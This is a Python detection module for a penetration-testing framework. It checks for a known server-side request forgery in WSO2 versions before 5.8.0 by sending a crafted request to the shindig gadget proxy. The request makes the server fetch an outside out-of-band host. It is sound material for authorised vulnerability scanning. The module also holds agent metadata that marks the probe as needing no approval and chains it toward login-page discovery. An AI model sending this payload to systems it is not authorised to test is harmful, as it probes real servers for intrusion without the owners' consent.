#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WSO2 prior to version 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WSO2 <5.8.0 - Server Side Request Forgery Detection',
        'description': 'WSO2 prior to version 5.8.0 is susceptible to a server-side request forgery vulnerability. This vulnerability can be exploited by misusing the UI gadgets loading capability of the shindig web application. An attacker can alter a specific URL in the request causing the server to initiate a GET request to the altered URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'ssrf', 'wso2', 'shindig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/shindig/gadgets/proxy?container=default&url=http://oast.pro', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="WSO2 <5.8.0 - Server Side Request Forgery detected",
                path='/shindig/gadgets/proxy?container=default&url=http://oast.pro',
            )
            return True
        return False

